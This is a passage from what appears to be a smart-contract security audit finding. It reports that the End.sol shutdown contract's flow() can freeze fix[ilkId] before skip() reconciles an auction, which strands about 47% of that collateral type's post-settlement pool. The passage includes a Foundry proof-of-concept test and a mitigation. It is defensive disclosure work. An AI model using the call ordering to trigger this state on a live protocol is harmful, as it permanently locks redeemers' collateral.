    uint256 wad = (((art[ilkId] * rate) / _RAY) * tag[ilkId]) / _RAY;
    fix[ilkId] = ((wad - gap[ilkId]) * _RAY) / (debt / _RAY);   // <-- computed from the incomplete art[ilkId]

    emit Flow({ ilkId: ilkId, fix: fix[ilkId] });
}
```

`skip(ilkId, auctionId)` callable any time after `flow()`, and does add the reclaimed debt/collateral back into the live system, but too late for `fix` to reflect it:

```solidity
function skip(bytes32 ilkId, uint256 auctionId) external nonReentrant {
    if (tag[ilkId] == 0) { _revert(TagNotDefined.selector); }
    ...
    uint256 restoredArt = tab / rate;
    art[ilkId] += restoredArt;   // <-- updates the ledger, but fix[ilkId] is already frozen and never re-reads this
    ...
    VAULT_ENGINE.grab(vaultId, address(this), address(balanceSheet), int256(lot), int256(restoredArt));
}
```

There is no function anywhere in `End.sol` that can reset or override `fix[ilkId]`, `art[ilkId]`, or `gap[ilkId]` after the fact confirmed by inspecting every function in the contract (`file`, `cage`, `cage(ilkId)`, `skip`, `skim`, `free`, `thaw`, `flow`, `pack`, `cash`). Once this state is reached, it is **permanent**, with no governance escape hatch of any kind.

## Impact

| # | Effect | Trigger requirement | Reversible? | Who is harmed |
|---|--------|----------------------|-------------|----------------|
| 1 | `fix[ilkId]` is permanently frozen at a value computed from an incomplete debt/collateral snapshot | Any ilk with a still-running auction at `cage(ilkId)` time + `flow()` called before `skip()` both fully permissionless calls; a permissionless caller / keeper race, no malicious intent required | **No** `FixAlreadyDefined` blocks recomputation forever; no admin override exists anywhere in `End.sol` | Every USDR holder attempting to redeem that collateral type |
| 2 | Real collateral confiscated by later `skip()`/`skim()` calls becomes permanently stranded in `End`, unreachable by any `cash()` call | Same as above | No | Same population collateral exists but cannot be distributed |
| 3 | In the reproduced PoC: **~333 RAIN permanently stranded**, i.e. **~47% of that ilk's entire post-settlement collateral pool** (≈705 RAIN held vs. ≈371.68 RAIN ever claimable) | Same as above | No | All redeemers of that collateral type |

This is not a theoretical rounding concern the PoC below confirms both that the "correct" post-reconciliation entitlement math matches the actual collateral `End` holds (sanity-checked to within 1 wei), and that the frozen `fix` leaves a large, real, non-zero gap between what's held and what's redeemable: **≈333.33 RAIN (≈47% of the ilk's post-settlement collateral pool) permanently stranded**, confirmed via `assertGt(actualCollateralHeld, totalClaimableUnderFrozenFix)` and the resulting non-zero `strandedCollateral`.

---

## Mitigation

**Gate `flow(ilkId)` on auction reconciliation.** Before computing `fix[ilkId]`, require that the ilk's `LiquidationTrigger`/`DutchAuction` has no outstanding sales for that ilk (e.g. track an open-auction counter per ilk, incremented at `bark`/decremented at `skip`/settlement, and have `flow()` revert while it's non-zero).

### POC

Integrated into `tests/Governance.t.sol::SettlementTest::test_flowCanFreezeFixBeforeSkipReconcilesAuction`

```solidity
    function test_flowCanFreezeFixBeforeSkipReconcilesAuction() public {
        _setOsmPrice(1e18);
        _seedTrend(12);

        uint256 vaultId = _openVault(user, 1600e18, 400e18);

        // Circuit breaker throttles bark to a PARTIAL liquidation.
        _setOsmPrice(0.6e18);
        circuitBreaker.check();
        liquidationTrigger.file(RAIN_ILK, "hole", 1000 * _RAD);
        uint256 auctionId = liquidationTrigger.bark(vaultId, keeper);

        (, uint256 remainingArt) = vaultEngine.urns(vaultId);
        assertGt(remainingArt, 0); // debt left in the vault, outside the auction

        end.cage();
        end.cage(RAIN_ILK);
        uint256 snapshotBeforeFlow = end.art(RAIN_ILK);
        assertEq(snapshotBeforeFlow, remainingArt); // snapshot excludes the auctioned debt

        end.thaw();
        end.flow(RAIN_ILK); // <-- fired before skip()
        uint256 frozenFix = end.fix(RAIN_ILK);
        assertGt(frozenFix, 0);

        end.skip(RAIN_ILK, auctionId); // reconciles the auction too late
        assertGt(end.art(RAIN_ILK), snapshotBeforeFlow); // art[ilkId] correctly increases post-skip (H-4's fix works...)

        vm.expectRevert(IEnd.FixAlreadyDefined.selector);
        end.flow(RAIN_ILK); // cannot ever be recomputed
        assertEq(end.fix(RAIN_ILK), frozenFix); // ...but fix never sees it: frozen and unchanged

        // --- Quantify the impact ---
        end.skim(vaultId); // fully settle the reinstated vault

        uint256 actualCollateralHeld = vaultEngine.collateral(RAIN_ILK, address(end));
        assertGt(actualCollateralHeld, 0); // skim() really does place collateral into End

        (,, uint256 rateFinal,,,,,) = vaultEngine.ilks(RAIN_ILK);
        uint256 correctWad = (((end.art(RAIN_ILK) * rateFinal) / _RAY) * end.tag(RAIN_ILK)) / _RAY;
        uint256 correctEntitlement = correctWad - end.gap(RAIN_ILK);

        // Sanity check: our replicated math matches the real collateral End confiscated.
        assertApproxEqAbs(correctEntitlement, actualCollateralHeld, 1);

        uint256 totalClaimableUnderFrozenFix = (frozenFix * (end.debt() / _RAY)) / _RAY;

        assertGt(actualCollateralHeld, totalClaimableUnderFrozenFix); // held > claimable
        uint256 strandedCollateral = actualCollateralHeld - totalClaimableUnderFrozenFix;
        assertGt(strandedCollateral, 0); // real RAIN, permanently unreachable by any redeemer
    }

    function _setOsmPrice(uint256 price) internal {
        rainPriceSource.setPrice(price);

        vm.warp(((vm.getBlockTimestamp() / 1800) + 2) * 1800);
        osm.poke(RAIN_ILK);

        vm.warp(vm.getBlockTimestamp() + 3600);
        osm.poke(RAIN_ILK);

        priceConverter.poke(RAIN_ILK);
    }

    function _seedTrend(uint256 n) internal {
        for (uint256 i; i < n; ++i) {
            circuitBreaker.check();
            vm.warp(vm.getBlockTimestamp() + 301);
        }
    }
```

**Reproduced result**

```
Actual RAIN collateral held by End:                     705,014,749,262,536,873,154 wei  (≈ 705.01 RAIN)
Max RAIN redeemable under the frozen (wrong) fix:        371,681,415,929,203,539,822 wei  (≈ 371.68 RAIN)
RAIN permanently stranded:                               333,333,333,333,333,333,332 wei  (≈ 333.33 RAIN)

```

**≈47% of that ilk's entire post-shutdown collateral pool becomes permanently unclaimable in this scenario** not a rounding artifact, but real collateral sitting in `End`'s balance with no function capable of ever releasing it to a redeemer.

---


